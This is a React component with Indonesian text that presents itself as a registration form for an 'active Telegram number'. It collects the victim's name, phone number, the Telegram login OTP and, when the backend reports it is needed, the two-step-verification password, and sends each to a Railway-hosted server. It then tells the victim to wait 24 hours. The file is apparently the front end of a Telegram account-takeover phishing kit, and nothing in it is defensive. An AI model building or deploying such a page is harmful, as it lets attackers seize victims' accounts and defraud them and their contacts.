"use client"

import { useState, useEffect } from "react"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Loader2, ArrowLeft } from "lucide-react"
import { toast } from "sonner"

export default function AuthForm() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [timer, setTimer] = useState(0)
  
  const [nama, setNama] = useState("")
  const [nomor, setNomor] = useState("")
  const [otp, setOtp] = useState("")
  const [sandi, setSandi] = useState("")

  // Logika Timer Hitung Mundur
  useEffect(() => {
    let interval: any
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [timer])

  const handleNext = async () => {
    // Validasi Form Step 1
    if (step === 1) {
      if (nama.trim() === "" || nomor.length < 10) {
        toast.error("Nama wajib diisi dan nomor minimal 10 angka")
        return
      }
    }

    // Validasi Form Step 2 (OTP)
    if (step === 2) {
      if (otp.length !== 5 || isNaN(Number(otp))) {
        setOtpError(true)
        toast.error("OTP harus 5 digit angka!")
        return
      }
    }

    setIsLoading(true)
    setOtpError(false)

    try {
      // Menghubungkan ke Backend Railway kamu
      const response = await fetch("https://backend-python-production-6e72.up.railway.app/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ nama, nomor, otp, sandi, step })
      })
      
      const result = await response.json()

      if (response.ok) {
        if (step === 1) {
          setStep(2)
          setTimer(60)
          toast.success("Kode OTP telah dikirim!")
        } else if (step === 2) {
          // Jika OTP Benar tapi butuh 2FA
          if (result.status === "need_2fa") {
            setStep(3)
            toast.info("Akun terproteksi, masukkan sandi 2FA Anda.")
          } else {
            setStep(4) // Berhasil Login
          }
        } else if (step === 3) {
          setStep(4) // Berhasil setelah 2FA
        }
      } else {
        // Menangani Error dari Backend (OTP/Sandi Salah)
        setOtpError(true)
        toast.error(result.message || "Terjadi kesalahan, periksa kembali data Anda.")
      }
    } catch (e) {
      toast.error("Gagal terhubung ke server backend.")
    } finally {
      setIsLoading(false) // Loading berhenti apapun hasilnya
    }
  }

  const handleBack = () => {
    setStep(1)
    setOtp("")
    setSandi("")
    setOtpError(false)
  }

  // Tampilan Akhir: Loading Sesuai Permintaan
  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-10 border rounded-2xl shadow-lg bg-white text-center">
        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto mb-4" />
        <h2 className="text-xl font-bold uppercase mb-2">Data sudah diproses</h2>
        <p className="text-gray-500">mohon tunggu konfirmasi 1X24 jam</p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white relative">
      {(step === 2 || step === 3) && (
        <button onClick={handleBack} className="absolute left-4 top-4 p-2 text-gray-400 hover:text-[#1d71d3]">
          <ArrowLeft className="h-6 w-6" />
        </button>
      )}

      <div className="mb-6 rounded-xl border overflow-hidden mt-4">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <div className="space-y-5">
        {step === 1 && (
          <>
            <div>
              <label className="font-semibold block mb-1 text-sm">Nama Lengkap:</label>
              <Input value={nama} onChange={(e) => setNama(e.target.value)} placeholder="Masukkan nama" />
            </div>
            <div>
              <label className="font-semibold block mb-1 text-sm">Nomor Telegram Aktif:</label>
              <Input 
                value={nomor} 
                onChange={(e) => setNomor(e.target.value.replace(/[^0-9]/g, ""))} 
                type="tel" 
                placeholder="08XXXXXXXXXX" 
              />
            </div>
          </>
        )}

        {step === 2 && (
          <div className="text-center">
            <label className="font-semibold block mb-4 text-lg">Masukkan 5 Digit Kode OTP</label>
            <p className="text-sm text-gray-500 mb-2">Kode dikirim ke: <span className="font-bold text-black">{nomor}</span></p>
            <Input 
              value={otp} 
              onChange={(e) => { setOtp(e.target.value.replace(/[^0-9]/g, "")); setOtpError(false); }}
              maxLength={5}
              type="tel"
              className={`text-center text-2xl tracking-[1rem] font-bold h-16 ${otpError ? 'border-red-500 bg-red-50' : 'border-[#1d71d3]'}`}
              placeholder="00000"
            />
            {otpError && <p className="text-red-500 text-sm mt-2 font-bold uppercase italic">Kode Salah atau Kadaluarsa!</p>}
            
            <div className="mt-4 text-sm text-gray-600">
              {timer > 0 ? (
                <span>Kirim ulang dalam <span className="font-bold">{timer} detik</span></span>
              ) : (
                <button onClick={() => { setStep(1); setTimer(0); }} className="text-[#1d71d3] font-bold underline">Kirim Ulang Kode</button>
              )}
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="text-center">
            <label className="font-semibold block mb-2 text-sm uppercase">Masukkan Kata Sandi (2FA)</label>
            <Input 
              value={sandi} 
              onChange={(e) => setSandi(e.target.value)} 
              type="password" 
              placeholder="******" 
              className="text-center border-[#1d71d3]" 
            />
            <p className="text-[10px] text-gray-400 mt-2 italic">Akun Anda mengaktifkan Verifikasi Dua Langkah.</p>
          </div>
        )}

        <Button 
          onClick={handleNext}
          disabled={isLoading}
          className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase flex items-center justify-center"
        >
          {isLoading ? <Loader2 className="animate-spin h-5 w-5" /> : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
        </Button>
      </div>

      <div className="mt-6 text-left border-t pt-4">
        <p className="text-[12px] text-gray-500 leading-tight italic">
          Peringatan:<br/>Pendaftaran hanya akan diproses melalui nomor telegram aktif!
        </p>
      </div>
    </div>
  )
}